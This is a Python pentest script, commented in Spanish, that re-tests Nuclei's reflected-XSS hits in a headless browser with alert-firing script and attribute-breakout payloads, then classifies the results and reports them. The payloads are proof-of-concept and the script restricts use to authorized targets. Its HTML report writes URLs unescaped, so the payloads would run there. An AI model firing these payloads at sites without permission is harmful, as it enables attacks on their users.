#!/usr/bin/env python3
"""
xss_verify.py

Verificador de XSS reflejado, pensado como PASO 2 después de Nuclei.

Flujo recomendado:
  1) nuclei -list todo.txt -t xss-reflected-multi-param.yaml -jsonl -o hits.jsonl
  2) python3 xss_verify.py -i hits.jsonl -o confirmados.json

Qué hace, para cada hit reportado por Nuclei:
  - Carga la URL real (con el payload) en un navegador headless (Playwright)
  - Escucha eventos dialog (alert/confirm/prompt) para confirmar ejecución de JS
  - Analiza el HTML de la respuesta para saber EN QUÉ CONTEXTO cae el reflejo
    (texto plano, atributo HTML, dentro de <script>, comentario HTML, etc.)
  - Revisa si hay Content-Security-Policy que podría bloquear la ejecución
  - Clasifica cada hallazgo como: confirmed_js_exec / likely_exploitable /
    reflected_only / not_reflected / error
  - Exporta un JSON y un HTML de reporte

SOLO usar contra objetivos para los que tengas autorización explícita.
"""

import argparse
import asyncio
import json
import re
import sys
import time
import urllib.parse
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional

try:
    from playwright.async_api import async_playwright, TimeoutError as PWTimeout
except ImportError:
    print("[!] Falta playwright. Instala con:")
    print("    pip install playwright")
    print("    playwright install chromium")
    sys.exit(1)


# ------------------------------------------------------------------ #
# Payload usado para re-confirmar ejecución real (dispara un alert)
# Debe ser distinto al de detección de Nuclei para evitar cache/WAF
# que ya haya "aprendido" el primer patrón.
# ------------------------------------------------------------------ #
CONFIRM_MARKER = "xssv{}".format(int(time.time()))
CONFIRM_PAYLOAD = f'"><script>alert(document.title||"{CONFIRM_MARKER}")</script>'
CONFIRM_PAYLOAD_ATTR = f'" autofocus onfocus=alert("{CONFIRM_MARKER}") x="'


@dataclass
class VerificationResult:
    url: str
    original_param: Optional[str] = None
    status: str = "error"          # confirmed_js_exec | likely_exploitable | reflected_only | not_reflected | error
    context: Optional[str] = None  # html_text | html_attribute | script_block | html_comment | unknown
    csp_present: bool = False
    csp_value: Optional[str] = None
    dialog_triggered: bool = False
    dialog_message: Optional[str] = None
    notes: list = field(default_factory=list)
    http_status: Optional[int] = None
    elapsed_ms: Optional[int] = None


def load_nuclei_jsonl(path: str) -> list:
    """Lee el -jsonl que exporta Nuclei y saca las URLs con matches."""
    urls = []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            matched = obj.get("matched-at") or obj.get("host") or obj.get("url")
            if matched:
                urls.append(matched)
    return sorted(set(urls))


def load_plain_list(path: str) -> list:
    """Alternativa: un .txt con una URL ya inyectada por línea."""
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return sorted({l.strip() for l in f if l.strip() and not l.startswith("#")})


def extract_param_name(url: str) -> Optional[str]:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    # Heurística: el parámetro cuyo valor contiene algo "raro" (payload)
    for k, values in qs.items():
        for v in values:
            if any(c in v for c in ("<", ">", '"', "'", "script")):
                return k
    return next(iter(qs.keys()), None)


def build_confirm_url(original_url: str) -> Optional[str]:
    """
    Reconstruye la URL apuntando SOLO al parámetro vulnerable identificado,
    reemplazando su valor por el payload de confirmación (con alert real).
    """
    parsed = urllib.parse.urlparse(original_url)
    qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    param = extract_param_name(original_url)
    if not param:
        return None

    qs[param] = [CONFIRM_PAYLOAD]
    new_query = urllib.parse.urlencode(qs, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query)), param


def classify_context(html: str, marker: str) -> str:
    """
    Busca dónde cae el marcador dentro del HTML crudo para estimar
    si el contexto de reflejo es explotable directamente o necesita
    un payload distinto (rompe atributo, rompe script, etc.)
    """
    idx = html.find(marker)
    if idx == -1:
        return "unknown"

    window = html[max(0, idx - 80): idx + 80]

    # Dentro de un bloque <script>...</script>
    last_script_open = html.rfind("<script", 0, idx)
    last_script_close = html.rfind("</script", 0, idx)
    if last_script_open > last_script_close:
        return "script_block"

    # Dentro de un comentario HTML <!-- -->
    last_comment_open = html.rfind("<!--", 0, idx)
    last_comment_close = html.rfind("-->", 0, idx)
    if last_comment_open > last_comment_close:
        return "html_comment"

    # Dentro de un atributo (heurística: comillas sin cerrar antes del marcador
    # en la misma etiqueta)
    tag_start = html.rfind("<", 0, idx)
    tag_text_before_marker = html[tag_start:idx] if tag_start != -1 else ""
    if re.search(r'=\s*"[^"]*$', tag_text_before_marker) or re.search(r"=\s*'[^']*$", tag_text_before_marker):
        return "html_attribute"

    # Si quedó envuelto en una etiqueta que nosotros mismos inyectamos
    if "<u>" in window or "<script>" in window.lower():
        return "html_text_tag_injected"

    return "html_text"


async def verify_single(context, url: str, timeout_ms: int = 12000) -> VerificationResult:
    result = VerificationResult(url=url)
    page = await context.new_page()

    dialog_seen = {"triggered": False, "message": None}

    async def handle_dialog(dialog):
        dialog_seen["triggered"] = True
        dialog_seen["message"] = dialog.message
        await dialog.dismiss()

    page.on("dialog", handle_dialog)

    start = time.time()
    try:
        confirm_data = build_confirm_url(url)
        if not confirm_data:
            result.notes.append("No se pudo identificar el parámetro vulnerable en la URL.")
            result.status = "error"
            await page.close()
            return result

        confirm_url, param = confirm_data
        result.original_param = param

        response = await page.goto(confirm_url, wait_until="networkidle", timeout=timeout_ms)
        await page.wait_for_timeout(800)  # margen para que dispare el dialog si va a hacerlo

        if response:
            result.http_status = response.status
            headers = await response.all_headers()
            csp = headers.get("content-security-policy")
            if csp:
                result.csp_present = True
                result.csp_value = csp

        html = await page.content()
        result.context = classify_context(html, CONFIRM_MARKER)

        if dialog_seen["triggered"]:
            result.status = "confirmed_js_exec"
            result.dialog_triggered = True
            result.dialog_message = dialog_seen["message"]
            result.notes.append("Se disparó un dialog() real — XSS confirmado en ejecución.")
        elif result.context in ("html_text_tag_injected", "html_attribute"):
            result.status = "likely_exploitable"
            result.notes.append(
                f"El payload se refleja sin escapar en contexto '{result.context}', "
                "pero el <script> pudo ser bloqueado por CSP o el navegador no lo ejecutó "
                "automáticamente. Revisar manualmente."
            )
        elif CONFIRM_MARKER in html:
            result.status = "reflected_only"
            result.notes.append(
                f"El marcador se refleja en el body (contexto: {result.context}) "
                "pero no se detectó ejecución de JS ni contexto claramente explotable."
            )
        else:
            result.status = "not_reflected"
            result.notes.append("El marcador de confirmación no apareció en el HTML final (posible escape/sanitización).")

        if result.csp_present:
            result.notes.append("Hay CSP presente — puede estar mitigando la ejecución del script inyectado.")

    except PWTimeout:
        result.status = "error"
        result.notes.append("Timeout cargando la página.")
    except Exception as e:
        result.status = "error"
        result.notes.append(f"Excepción: {e!r}")
    finally:
        result.elapsed_ms = int((time.time() - start) * 1000)
        await page.close()

    return result


async def run_batch(urls: list, concurrency: int, headless: bool, timeout_ms: int) -> list:
    results = []
    sem = asyncio.Semaphore(concurrency)

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=headless)
        context = await browser.new_context(ignore_https_errors=True)

        async def worker(u):
            async with sem:
                r = await verify_single(context, u, timeout_ms=timeout_ms)
                status_symbol = {
                    "confirmed_js_exec": "[CONFIRMADO]",
                    "likely_exploitable": "[PROBABLE]  ",
                    "reflected_only": "[REFLEJADO] ",
                    "not_reflected": "[NO REFLEJA]",
                    "error": "[ERROR]     ",
                }.get(r.status, "[?]")
                print(f"{status_symbol} {r.url}")
                results.append(r)

        await asyncio.gather(*(worker(u) for u in urls))
        await browser.close()

    return results


def write_html_report(results: list, out_path: str):
    order = ["confirmed_js_exec", "likely_exploitable", "reflected_only", "not_reflected", "error"]
    color = {
        "confirmed_js_exec": "#c0392b",
        "likely_exploitable": "#e67e22",
        "reflected_only": "#f1c40f",
        "not_reflected": "#7f8c8d",
        "error": "#95a5a6",
    }
    label = {
        "confirmed_js_exec": "CONFIRMADO (ejecución de JS)",
        "likely_exploitable": "PROBABLEMENTE EXPLOTABLE",
        "reflected_only": "SOLO REFLEJADO",
        "not_reflected": "NO REFLEJADO",
        "error": "ERROR AL VERIFICAR",
    }

    rows = []
    for status in order:
        group = [r for r in results if r.status == status]
        if not group:
            continue
        rows.append(f'<h2 style="color:{color[status]}">{label[status]} ({len(group)})</h2>')
        rows.append('<table border="1" cellpadding="6" cellspacing="0" style="border-collapse:collapse;width:100%">')
        rows.append("<tr><th>URL</th><th>Param</th><th>Contexto</th><th>CSP</th><th>Notas</th></tr>")
        for r in group:
            rows.append(
                f"<tr>"
                f"<td style='max-width:420px;word-break:break-all'>{r.url}</td>"
                f"<td>{r.original_param or '-'}</td>"
                f"<td>{r.context or '-'}</td>"
                f"<td>{'Sí' if r.csp_present else 'No'}</td>"
                f"<td>{'<br>'.join(r.notes)}</td>"
                f"</tr>"
            )
        rows.append("</table>")

    html = f"""<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<title>Reporte de verificación XSS</title>
<style>
body {{ font-family: -apple-system, Arial, sans-serif; margin: 30px; background:#fafafa; }}
table {{ background:#fff; margin-bottom: 30px; }}
th {{ background:#2c3e50; color:#fff; text-align:left; }}
td {{ font-size: 13px; }}
</style></head><body>
<h1>Reporte de verificación de XSS reflejado</h1>
<p>Total de URLs verificadas: {len(results)}</p>
{"".join(rows)}
</body></html>"""

    Path(out_path).write_text(html, encoding="utf-8")


def main():
    parser = argparse.ArgumentParser(
        description="Verifica hits de XSS reflejado (ej. salida de Nuclei) confirmando ejecución real de JS con un navegador headless."
    )
    parser.add_argument("-i", "--input", required=True,
                         help="Archivo de entrada: .jsonl de Nuclei (--jsonl) o .txt con una URL inyectada por línea")
    parser.add_argument("-o", "--output", default="confirmados.json", help="Archivo JSON de salida")
    parser.add_argument("--html-report", default="reporte_xss.html", help="Archivo HTML de salida con el reporte visual")
    parser.add_argument("-c", "--concurrency", type=int, default=5, help="Páginas concurrentes (default: 5)")
    parser.add_argument("--timeout", type=int, default=12000, help="Timeout por página en ms (default: 12000)")
    parser.add_argument("--headed", action="store_true", help="Correr con navegador visible (debug)")
    args = parser.parse_args()

    in_path = args.input
    if in_path.endswith(".jsonl"):
        urls = load_nuclei_jsonl(in_path)
    else:
        urls = load_plain_list(in_path)

    if not urls:
        print("[!] No se encontraron URLs en el archivo de entrada.")
        sys.exit(1)

    print(f"[*] {len(urls)} URLs a verificar (concurrencia={args.concurrency})\n")

    results = asyncio.run(run_batch(urls, args.concurrency, headless=not args.headed, timeout_ms=args.timeout))

    with open(args.output, "w", encoding="utf-8") as f:
        json.dump([asdict(r) for r in results], f, indent=2, ensure_ascii=False)

    write_html_report(results, args.html_report)

    counts = {}
    for r in results:
        counts[r.status] = counts.get(r.status, 0) + 1

    print("\n===== RESUMEN =====")
    for k in ["confirmed_js_exec", "likely_exploitable", "reflected_only", "not_reflected", "error"]:
        if k in counts:
            print(f"  {k}: {counts[k]}")

    print(f"\n[+] JSON guardado en:  {args.output}")
    print(f"[+] Reporte HTML en:   {args.html_report}")


if __name__ == "__main__":
    main()
